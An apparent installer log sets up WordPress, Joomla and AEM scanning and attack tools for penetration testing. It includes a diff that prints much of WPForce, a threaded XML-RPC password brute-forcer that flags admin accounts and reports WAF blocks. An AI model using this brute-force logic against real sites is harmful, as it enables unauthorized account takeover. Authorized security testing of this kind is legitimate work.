+[2026-03-04 13:55:29] RUN(user:spabam): bash -lc cd "/home/spabam/.venv/cms_scanner/_build/clusterd-src" && env PYTHONWARNINGS=ignore::SyntaxWarning PYTHONPATH="/home/spabam/.venv/cms_scanner/_build/clusterd-src/src:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/weblogic:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/weblogic/deployers:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/weblogic/fingerprints:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/weblogic/auxiliary:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/coldfusion:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/coldfusion/deployers:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/coldfusion/fingerprints:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/coldfusion/auxiliary:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/tomcat:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/tomcat/deployers:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/tomcat/fingerprints:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/tomcat/auxiliary:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/railo:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/railo/deployers:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/railo/fingerprints:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/railo/auxiliary:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/axis2:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/axis2/deployers:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/axis2/fingerprints:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/axis2/auxiliary:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/deployers:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/fingerprints:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/auxiliary:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/glassfish:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/glassfish/deployers:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/glassfish/fingerprints:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/glassfish/auxiliary:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/__pycache__:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/core:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/core/__pycache__:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/lib:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/lib/coldfusion:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/lib/railo:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/lib/railo/railopass:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/lib/axis2:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/lib/resources:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/lib/jboss:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/lib/jboss/bsh_deploy:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/lib/jboss/jmxinvoke_deploy:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/lib/jboss/webconsole_deploy:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/module:/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/module/__pycache__:${PYTHONPATH:-}" "/home/spabam/.venv/cms_scanner/clusterd/bin/python" "/home/spabam/.venv/cms_scanner/_build/clusterd-src/clusterd.py" --help
+[32m
+		clusterd/0.5 - clustered attack toolkit[0m
+			[33m[Supporting 7 platforms][0m
+
+Traceback (most recent call last):
+  File "/home/spabam/.venv/cms_scanner/_build/clusterd-src/clusterd.py", line 110, in <module>
+    options = parse(sys.argv[1:])
+  File "/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/core/parse_cmd.py", line 95, in parse
+    group = build_platform_flags(platform, group)
+  File "/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/core/auxengine.py", line 79, in build_platform_flags
+    mod = auxiliary[0].find_module(auxiliary[1]).load_module(auxiliary[1])
+  File "/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/core/sitecustomize.py", line 17, in load_module
+    return self._loader.load_module(name)
+           ~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^
+  File "<frozen importlib._bootstrap_external>", line 680, in _check_name_wrapper
+  File "<frozen importlib._bootstrap_external>", line 1207, in load_module
+  File "<frozen importlib._bootstrap_external>", line 1031, in load_module
+  File "<frozen importlib._bootstrap>", line 537, in _load_module_shim
+  File "<frozen importlib._bootstrap>", line 966, in _load
+  File "<frozen importlib._bootstrap>", line 935, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 1026, in exec_module
+  File "<frozen importlib._bootstrap>", line 488, in _call_with_frames_removed
+  File "/home/spabam/.venv/cms_scanner/_build/clusterd-src/src/platform/jboss/auxiliary/verb_tamper.py", line 6, in <module>
+    from urllib import quote_plus
+ImportError: cannot import name 'quote_plus' from 'urllib' (/usr/lib/python3.13/urllib/__init__.py)
+[2026-03-04 13:55:29] SKIP: Clusterd - runtime compatibility issues on current platform
+[2026-03-04 13:55:29] RUN(user:spabam): git -C /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/WPSeku pull --ff-only
+Already up to date.
+[2026-03-04 13:55:29] RUN(user:spabam): python3 -m venv /home/spabam/.venv/cms_scanner/wpseku
+[2026-03-04 13:55:30] RUN(user:spabam): /home/spabam/.venv/cms_scanner/wpseku/bin/python -
+[2026-03-04 13:55:30] RUN(user:spabam): /home/spabam/.venv/cms_scanner/wpseku/bin/pip install --upgrade pip
+Requirement already satisfied: pip in /home/spabam/.venv/cms_scanner/wpseku/lib/python3.13/site-packages (25.1.1)
+Collecting pip
+  Using cached pip-26.0.1-py3-none-any.whl.metadata (4.7 kB)
+Using cached pip-26.0.1-py3-none-any.whl (1.8 MB)
+Installing collected packages: pip
+  Attempting uninstall: pip
+    Found existing installation: pip 25.1.1
+    Uninstalling pip-25.1.1:
+      Successfully uninstalled pip-25.1.1
+Successfully installed pip-26.0.1
+[2026-03-04 13:55:31] RUN(user:spabam): /home/spabam/.venv/cms_scanner/wpseku/bin/python -
+[2026-03-04 13:55:31] RUN(user:spabam): /home/spabam/.venv/cms_scanner/wpseku/bin/pip install -r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/WPSeku/requirements.txt
+Collecting requests (from -r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/WPSeku/requirements.txt (line 1))
+  Using cached requests-2.32.5-py3-none-any.whl.metadata (4.9 kB)
+Collecting urllib3 (from -r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/WPSeku/requirements.txt (line 2))
+  Using cached urllib3-2.6.3-py3-none-any.whl.metadata (6.9 kB)
+Collecting humanfriendly (from -r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/WPSeku/requirements.txt (line 3))
+  Downloading humanfriendly-10.0-py2.py3-none-any.whl.metadata (9.2 kB)
+Collecting charset_normalizer<4,>=2 (from requests->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/WPSeku/requirements.txt (line 1))
+  Using cached charset_normalizer-3.4.4-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl.metadata (37 kB)
+Collecting idna<4,>=2.5 (from requests->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/WPSeku/requirements.txt (line 1))
+  Using cached idna-3.11-py3-none-any.whl.metadata (8.4 kB)
+Collecting certifi>=2017.4.17 (from requests->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/WPSeku/requirements.txt (line 1))
+  Using cached certifi-2026.2.25-py3-none-any.whl.metadata (2.5 kB)
+Using cached requests-2.32.5-py3-none-any.whl (64 kB)
+Using cached urllib3-2.6.3-py3-none-any.whl (131 kB)
+Using cached charset_normalizer-3.4.4-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl (153 kB)
+Using cached idna-3.11-py3-none-any.whl (71 kB)
+Downloading humanfriendly-10.0-py2.py3-none-any.whl (86 kB)
+Using cached certifi-2026.2.25-py3-none-any.whl (153 kB)
+Installing collected packages: urllib3, idna, humanfriendly, charset_normalizer, certifi, requests
+
+Successfully installed certifi-2026.2.25 charset_normalizer-3.4.4 humanfriendly-10.0 idna-3.11 requests-2.32.5 urllib3-2.6.3
+[2026-03-04 13:55:32] OK: WPSeku installed
+[2026-03-04 13:55:32] RUN(user:spabam): gem install --user-install wpxf
+installer.sh: line 131: gem: command not found
+[2026-03-04 13:55:32] FAIL: WPXF - gem install failed
+[2026-03-04 13:55:32] RUN(user:spabam): git -C /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/WPForce pull --ff-only
+Already up to date.
+[2026-03-04 13:55:32] RUN(user:spabam): python3 -m venv /home/spabam/.venv/cms_scanner/wpforce
+[2026-03-04 13:55:33] RUN(user:spabam): /home/spabam/.venv/cms_scanner/wpforce/bin/python -
+[2026-03-04 13:55:33] RUN(user:spabam): /home/spabam/.venv/cms_scanner/wpforce/bin/pip install --upgrade pip
+Requirement already satisfied: pip in /home/spabam/.venv/cms_scanner/wpforce/lib/python3.13/site-packages (25.1.1)
+Collecting pip
+  Using cached pip-26.0.1-py3-none-any.whl.metadata (4.7 kB)
+Using cached pip-26.0.1-py3-none-any.whl (1.8 MB)
+Installing collected packages: pip
+  Attempting uninstall: pip
+    Found existing installation: pip 25.1.1
+    Uninstalling pip-25.1.1:
+      Successfully uninstalled pip-25.1.1
+Successfully installed pip-26.0.1
+[2026-03-04 13:55:34] RUN(user:spabam): /home/spabam/.venv/cms_scanner/wpforce/bin/python -
+[2026-03-04 13:55:34] RUN(user:spabam): /home/spabam/.venv/cms_scanner/wpforce/bin/pip install --upgrade pip modernize six
+Requirement already satisfied: pip in /home/spabam/.venv/cms_scanner/wpforce/lib/python3.13/site-packages (26.0.1)
+Collecting modernize
+  Using cached modernize-0.8.0-py2.py3-none-any.whl.metadata (2.5 kB)
+Collecting six
+  Using cached six-1.17.0-py2.py3-none-any.whl.metadata (1.7 kB)
+Collecting fissix (from modernize)
+  Using cached fissix-24.4.24-py3-none-any.whl.metadata (2.1 kB)
+Collecting appdirs>=1.4.4 (from fissix->modernize)
+  Using cached appdirs-1.4.4-py2.py3-none-any.whl.metadata (9.0 kB)
+Using cached modernize-0.8.0-py2.py3-none-any.whl (27 kB)
+Using cached six-1.17.0-py2.py3-none-any.whl (11 kB)
+Using cached fissix-24.4.24-py3-none-any.whl (188 kB)
+Using cached appdirs-1.4.4-py2.py3-none-any.whl (9.6 kB)
+Installing collected packages: appdirs, six, fissix, modernize
+
+Successfully installed appdirs-1.4.4 fissix-24.4.24 modernize-0.8.0 six-1.17.0
+[2026-03-04 13:55:35] RUN(user:spabam): cp /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/WPForce/wpforce.py /home/spabam/.venv/cms_scanner/wpforce/wpforce.py
+[2026-03-04 13:55:35] RUN(user:spabam): /home/spabam/.venv/cms_scanner/wpforce/bin/modernize -w -n -f default /home/spabam/.venv/cms_scanner/wpforce/wpforce.py
+ Loading the following fixers:
+    fissix.fixes.fix_apply  (apply)
+    fissix.fixes.fix_except  (except)
+    fissix.fixes.fix_exec  (exec)
+    fissix.fixes.fix_execfile  (execfile)
+    fissix.fixes.fix_exitfunc  (exitfunc)
+    fissix.fixes.fix_funcattrs  (funcattrs)
+    fissix.fixes.fix_has_key  (has_key)
+    fissix.fixes.fix_idioms  (idioms)
+    fissix.fixes.fix_long  (long)
+    fissix.fixes.fix_methodattrs  (methodattrs)
+    fissix.fixes.fix_ne  (ne)
+    fissix.fixes.fix_numliterals  (numliterals)
+    fissix.fixes.fix_operator  (operator)
+    fissix.fixes.fix_paren  (paren)
+    fissix.fixes.fix_reduce  (reduce)
+    fissix.fixes.fix_renames  (renames)
+    fissix.fixes.fix_repr  (repr)
+    fissix.fixes.fix_set_literal  (set_literal)
+    fissix.fixes.fix_standarderror  (standarderror)
+    fissix.fixes.fix_sys_exc  (sys_exc)
+    fissix.fixes.fix_throw  (throw)
+    fissix.fixes.fix_tuple_params  (tuple_params)
+    fissix.fixes.fix_types  (types)
+    fissix.fixes.fix_ws_comma  (ws_comma)
+    fissix.fixes.fix_xreadlines  (xreadlines)
+    libmodernize.fixes.fix_basestring  (basestring)
+    libmodernize.fixes.fix_dict_six  (dict_six)
+    libmodernize.fixes.fix_file  (file)
+    libmodernize.fixes.fix_filter  (filter)
+    libmodernize.fixes.fix_import  (import)
+    libmodernize.fixes.fix_imports_six  (imports_six)
+    libmodernize.fixes.fix_input_six  (input_six)
+    libmodernize.fixes.fix_int_long_tuple  (int_long_tuple)
+    libmodernize.fixes.fix_itertools_imports_six  (itertools_imports_six)
+    libmodernize.fixes.fix_itertools_six  (itertools_six)
+    libmodernize.fixes.fix_map  (map)
+    libmodernize.fixes.fix_metaclass  (metaclass)
+    libmodernize.fixes.fix_next  (next)
+    libmodernize.fixes.fix_print  (print)
+    libmodernize.fixes.fix_raise  (raise)
+    libmodernize.fixes.fix_raise_six  (raise_six)
+    libmodernize.fixes.fix_unichr  (unichr)
+    libmodernize.fixes.fix_unicode_type  (unicode_type)
+    libmodernize.fixes.fix_urllib_six  (urllib_six)
+    libmodernize.fixes.fix_xrange_six  (xrange_six)
+    libmodernize.fixes.fix_zip  (zip)
+ Applying the following explicit transformations:
+    (None)
+
+RefactoringTool: Skipping optional fixer: idioms
+RefactoringTool: Skipping optional fixer: set_literal
+RefactoringTool: Skipping optional fixer: ws_comma
+RefactoringTool: Refactored /home/spabam/.venv/cms_scanner/wpforce/wpforce.py
+RefactoringTool: Files that were modified:
+RefactoringTool: /home/spabam/.venv/cms_scanner/wpforce/wpforce.py
+--- /home/spabam/.venv/cms_scanner/wpforce/wpforce.py	(original)
++++ /home/spabam/.venv/cms_scanner/wpforce/wpforce.py	(refactored)
+@@ -1,11 +1,14 @@
++from __future__ import absolute_import
++from __future__ import print_function
+ import re
+ import sys
+ import time
+ import socket
+-import urllib2
++import six.moves.urllib.request, six.moves.urllib.error, six.moves.urllib.parse
+ import argparse
+ import threading
+-from urlparse import urljoin
++from six.moves.urllib.parse import urljoin
++from six.moves import range
+ 
+ __author__ = 'n00py'
+ # These variables must be shared by all threads dynamically
+@@ -24,7 +27,7 @@
+     except:
+         return False
+ has_colours = has_colours(sys.stdout)
+-BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE = range(8)
++BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE = list(range(8))
+ 
+ 
+ def printout(text, colour=WHITE):
+@@ -44,9 +47,9 @@
+     for i in range(size):
+         result.append([])
+         for j in range(slice_size):
+-            result[i].append(iterator.next())
++            result[i].append(next(iterator))
+         if remain:
+-            result[i].append(iterator.next())
++            result[i].append(next(iterator))
+             remain -= 1
+     return result
+ 
+@@ -69,11 +72,11 @@
+ 
+ def BuildThreads(list_array,url,debug,userlist,verbose,agent):
+     if debug:
+-        print "Here is the content of the wordlists for each thread"
++        print("Here is the content of the wordlists for each thread")
+         for i in range(len(list_array)):
+-            print "Thread " + str(i)
++            print("Thread " + str(i))
+             printout(str(list_array[i]), YELLOW)
+-            print "\n-----------------------------------------------------"
++            print("\n-----------------------------------------------------")
+     threads = []
+     for i in range(len(list_array)):
+         t = threading.Thread(target=worker, args=(list_array[i], i, url,userlist,verbose,debug,agent))
+@@ -93,30 +96,30 @@
+        /  __/~| ...||__/|-"   Brute Force Attack Tool for Wordpress
+      =(  _____||________|                 ~n00py~
+     """
+-    print banner
+-    print ("Username List: %s" % input) + " (" + str(len(userlist)) + ")"
+-    print ("Password List: %s" % wordlist) + " (" + str(len(passlist)) + ")"
+-    print ("URL: %s" % url)
++    print(banner)
++    print(("Username List: %s" % input) + " (" + str(len(userlist)) + ")")
++    print(("Password List: %s" % wordlist) + " (" + str(len(passlist)) + ")")
++    print(("URL: %s" % url))
+ 
+ 
+ def TestSite(url):
+     protocheck(url)
+-    print "Trying: " + url
++    print("Trying: " + url)
+     try:
+-        urllib2.urlopen(url, timeout=3)
+-    except urllib2.HTTPError, e:
++        six.moves.urllib.request.urlopen(url, timeout=3)
++    except six.moves.urllib.error.HTTPError as e:
+         if e.code == 405:
+-            print url + " found!"
+-            print "Now the brute force will begin!  >:)"
++            print(url + " found!")
++            print("Now the brute force will begin!  >:)")
+         if e.code == 404:
+             printout(str(e), YELLOW)
+-            print " - XMLRPC has been moved, removed, or blocked"
++            print(" - XMLRPC has been moved, removed, or blocked")
+             sys.exit()
+-    except urllib2.URLError, g:
++    except six.moves.urllib.error.URLError as g:
+         printout("Could not identify XMLRPC.  Please verify the domain.\n", YELLOW)
+         sys.exit()
+     except socket.timeout as e:
+-        print type(e)
++        print(type(e))
+         printout("The socket timed out, try it again.", YELLOW)
+         sys.exit()
+ 
+@@ -127,50 +130,50 @@
+         if debug is True:
+             thready = "[Thread " + str(thread_no) + "]"
+             printout(thready, YELLOW)
+-        print "Trying " + user + " : " + password + "\n",
++        print("Trying " + user + " : " + password + "\n", end=' ')
+     headers = {'User-Agent': agent,
+                'Connection': 'keep-alive',
+                'Accept': 'text/html'
+                }
+     post = "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>" + user + "</string></value></param><param><value><string>" + password + "</string></value></param></params></methodCall>"
+     try:
+-        req = urllib2.Request(url, post, headers)
+-        response = urllib2.urlopen(req, timeout=3)
++        req = six.moves.urllib.request.Request(url, post, headers)
++        response = six.moves.urllib.request.urlopen(req, timeout=3)
+         the_page = response.read()
+         look_for = "isAdmin"
+         try:
+             splitter = the_page.split(look_for, 1)[1]
+             correct_pairs[user] = password
+-            print "--------------------------"
++            print("--------------------------")
+             success = "[" + user + " : " + password + "] are valid credentials!  "
+             adminAlert = ""
+             if splitter[23] == "1":
+                 adminAlert = "- THIS ACCOUNT IS ADMIN"
+             printout(success, GREEN)
+             printout(adminAlert, RED)
+-            print "\n--------------------------"
++            print("\n--------------------------")
+         except:
+             pass
+-    except urllib2.URLError, e:
++    except six.moves.urllib.error.URLError as e:
+         if e.code == 404 or e.code == 403:
+             global total
+             printout(str(e), YELLOW)
+-            print " - WAF or security plugin likely in use"
++            print(" - WAF or security plugin likely in use")
+             total = len(passlist)
+             sys.exit()
+         else:
+             printout(str(e), YELLOW)
+-            print " - Try reducing Thread count "
++            print(" - Try reducing Thread count ")
+             if args.verbose is True or args.debug is True:
+-                print user + ":" + password + " was skipped"
++                print(user + ":" + password + " was skipped")
+     except socket.timeout as e:
+         printout(str(e), YELLOW)
+-        print " - Try reducing Thread count "
++        print(" - Try reducing Thread count ")
+         if args.verbose is True or args.debug is True:
+-            print user + ":" + password + " was skipped"
++            print(user + ":" + password + " was skipped")
+     except socket.error as e:
+         printout(str(e), YELLOW)
+-        print " - Got an RST, Probably tripped the firewall\n",
++        print(" - Got an RST, Probably tripped the firewall\n", end=' ')
+         total = len(passlist)
+         sys.exit()
+ 
+@@ -216,11 +219,11 @@
+             time.sleep(0.1)
+             sys.stdout.flush()
+             percent = "%.0f%%" % (100 * (total)/len(passlist))
+-            print " " + percent + " Percent Complete\r",
++            print(" " + percent + " Percent Complete\r", end=' ')
+     
+-    print "\nAll correct pairs:"
++    print("\nAll correct pairs:")
+     printout(str(correct_pairs), GREEN)
+-    print ""
++    print("")
+ 
+ if __name__ == "__main__":
+     main()
+[2026-03-04 13:55:35] RUN(user:spabam): /home/spabam/.venv/cms_scanner/wpforce/bin/pip install requests six
+Collecting requests
+  Using cached requests-2.32.5-py3-none-any.whl.metadata (4.9 kB)
+Requirement already satisfied: six in /home/spabam/.venv/cms_scanner/wpforce/lib/python3.13/site-packages (1.17.0)
+Collecting charset_normalizer<4,>=2 (from requests)
+  Using cached charset_normalizer-3.4.4-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl.metadata (37 kB)
+Collecting idna<4,>=2.5 (from requests)
+  Using cached idna-3.11-py3-none-any.whl.metadata (8.4 kB)
+Collecting urllib3<3,>=1.21.1 (from requests)
+  Using cached urllib3-2.6.3-py3-none-any.whl.metadata (6.9 kB)
+Collecting certifi>=2017.4.17 (from requests)
+  Using cached certifi-2026.2.25-py3-none-any.whl.metadata (2.5 kB)
+Using cached requests-2.32.5-py3-none-any.whl (64 kB)
+Using cached charset_normalizer-3.4.4-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl (153 kB)
+Using cached idna-3.11-py3-none-any.whl (71 kB)
+Using cached urllib3-2.6.3-py3-none-any.whl (131 kB)
+Using cached certifi-2026.2.25-py3-none-any.whl (153 kB)
+Installing collected packages: urllib3, idna, charset_normalizer, certifi, requests
+
+Successfully installed certifi-2026.2.25 charset_normalizer-3.4.4 idna-3.11 requests-2.32.5 urllib3-2.6.3
+[2026-03-04 13:55:35] RUN(user:spabam): env PYTHONWARNINGS=ignore::SyntaxWarning /home/spabam/.venv/cms_scanner/wpforce/bin/python /home/spabam/.venv/cms_scanner/wpforce/wpforce.py -h
+usage: wpforce.py [-h] (-i INPUT |
+                  -si--singleinput SINGLEINPUT [SINGLEINPUT ...]) -w WORDLIST
+                  -u URL [-v] [-t THREADS] [-a AGENT] [-d]
+
+This is a tool to brute force Worpress using the Wordpress API
+
+options:
+  -h, --help            show this help message and exit
+  -i, --input INPUT     Input file name
+  -si--singleinput SINGLEINPUT [SINGLEINPUT ...]
+                        Input list of users
+  -w, --wordlist WORDLIST
+                        Wordlist file name
+  -u, --url URL         URL of target
+  -v, --verbose         Verbose output. Show the attemps as they happen.
+  -t, --threads THREADS
+                        Determines the number of threads to be used, default
+                        is 10
+  -a, --agent AGENT     Determines the user-agent
+  -d, --debug           This option is used for determining issues with the
+                        script.
+[2026-03-04 13:55:35] OK: WPForce installed
+[2026-03-04 13:55:35] RUN(user:spabam): git -C /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/joomlavs pull --ff-only
+Already up to date.
+[2026-03-04 13:55:35] RUN(user:spabam): gem install --user-install slop typhoeus
+installer.sh: line 131: gem: command not found
+[2026-03-04 13:55:35] FAIL: joomlavs - required gems installation failed
+[2026-03-04 13:55:36] RUN(user:spabam): git -C /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/fingerprinter pull --ff-only
+Already up to date.
+[2026-03-04 13:55:36] INFO: Using Fingerprinter fallback repository: https://github.com/erwanlr/Fingerprinter.git
+[2026-03-04 13:55:36] OK: Fingerprinter installed
+[2026-03-04 13:55:37] RUN(user:spabam): git -C /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/AutoWPScan pull --ff-only
+Already up to date.
+[2026-03-04 13:55:37] INFO: Using AutoWPScan fallback repository: https://github.com/password123456/autowpscan.git
+[2026-03-04 13:55:37] OK: AutoWPScan installed
+[2026-03-04 13:55:37] RUN(user:spabam): git -C /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/aem-hacker pull --ff-only
+Already up to date.
+[2026-03-04 13:55:37] RUN(user:spabam): python3 -m venv /home/spabam/.venv/cms_scanner/aem-hacker
+[2026-03-04 13:55:39] RUN(user:spabam): /home/spabam/.venv/cms_scanner/aem-hacker/bin/python -
+[2026-03-04 13:55:39] RUN(user:spabam): /home/spabam/.venv/cms_scanner/aem-hacker/bin/pip install --upgrade pip
+Requirement already satisfied: pip in /home/spabam/.venv/cms_scanner/aem-hacker/lib/python3.13/site-packages (25.1.1)
+Collecting pip
+  Using cached pip-26.0.1-py3-none-any.whl.metadata (4.7 kB)
+Using cached pip-26.0.1-py3-none-any.whl (1.8 MB)
+Installing collected packages: pip
+  Attempting uninstall: pip
+    Found existing installation: pip 25.1.1
+    Uninstalling pip-25.1.1:
+      Successfully uninstalled pip-25.1.1
+Successfully installed pip-26.0.1
+[2026-03-04 13:55:39] RUN(user:spabam): /home/spabam/.venv/cms_scanner/aem-hacker/bin/python -
+[2026-03-04 13:55:39] RUN(user:spabam): /home/spabam/.venv/cms_scanner/aem-hacker/bin/pip install -r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/aem-hacker/requirements.txt
+Collecting requests (from -r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/aem-hacker/requirements.txt (line 1))
+  Using cached requests-2.32.5-py3-none-any.whl.metadata (4.9 kB)
+Collecting charset_normalizer<4,>=2 (from requests->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/aem-hacker/requirements.txt (line 1))
+  Using cached charset_normalizer-3.4.4-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl.metadata (37 kB)
+Collecting idna<4,>=2.5 (from requests->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/aem-hacker/requirements.txt (line 1))
+  Using cached idna-3.11-py3-none-any.whl.metadata (8.4 kB)
+Collecting urllib3<3,>=1.21.1 (from requests->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/aem-hacker/requirements.txt (line 1))
+  Using cached urllib3-2.6.3-py3-none-any.whl.metadata (6.9 kB)
+Collecting certifi>=2017.4.17 (from requests->-r /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/tools/aem-hacker/requirements.txt (line 1))
+  Using cached certifi-2026.2.25-py3-none-any.whl.metadata (2.5 kB)
+Using cached requests-2.32.5-py3-none-any.whl (64 kB)
+Using cached charset_normalizer-3.4.4-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl (153 kB)
+Using cached idna-3.11-py3-none-any.whl (71 kB)
+Using cached urllib3-2.6.3-py3-none-any.whl (131 kB)
+Using cached certifi-2026.2.25-py3-none-any.whl (153 kB)
+Installing collected packages: urllib3, idna, charset_normalizer, certifi, requests
+
+Successfully installed certifi-2026.2.25 charset_normalizer-3.4.4 idna-3.11 requests-2.32.5 urllib3-2.6.3
+[2026-03-04 13:55:40] OK: AEM Detector installed
+[2026-03-04 13:55:40] ==================== INSTALL SUMMARY ====================
+[2026-03-04 13:55:40] Install user: spabam (/home/spabam)
+[2026-03-04 13:55:40] Python venv root: /home/spabam/.venv/cms_scanner
+[2026-03-04 13:55:40] Installed tools: 13
+[2026-03-04 13:55:40]   - CMSmap
+[2026-03-04 13:55:40]   - CMSeek
+[2026-03-04 13:55:40]   - Droopescan
+[2026-03-04 13:55:40]   - JoomScan
+[2026-03-04 13:55:40]   - Drupwn
+[2026-03-04 13:55:40]   - VBScan
+[2026-03-04 13:55:40]   - CMSScan
+[2026-03-04 13:55:40]   - VulnX
+[2026-03-04 13:55:40]   - WPSeku
+[2026-03-04 13:55:40]   - WPForce
+[2026-03-04 13:55:40]   - Fingerprinter
+[2026-03-04 13:55:40]   - AutoWPScan
+[2026-03-04 13:55:40]   - AEM Detector
+[2026-03-04 13:55:40] Skipped tools: 2
+[2026-03-04 13:55:40]   - WPScan: gem install failed (missing ruby headers). Re-run with --system-deps.
+[2026-03-04 13:55:40]   - Clusterd: runtime compatibility issues on current platform
+[2026-03-04 13:55:40] Failed tools: 2
+[2026-03-04 13:55:40]   - WPXF: gem install failed
+[2026-03-04 13:55:40]   - joomlavs: required gems installation failed
+[2026-03-04 13:55:40] Warnings: 1
+[2026-03-04 13:55:40]   - WPScan requires ruby development headers (ruby-dev) and build tools for gem native extensions.
+[2026-03-04 13:55:40] Wrappers are available in: /home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/bin
+[2026-03-04 13:55:40] Add to PATH: export PATH="/home/spabam/Dropbox/Public/VANTAGE/VAPT/WA-SCAN/infra_fuzzer/cms_scanner/bin:$PATH"
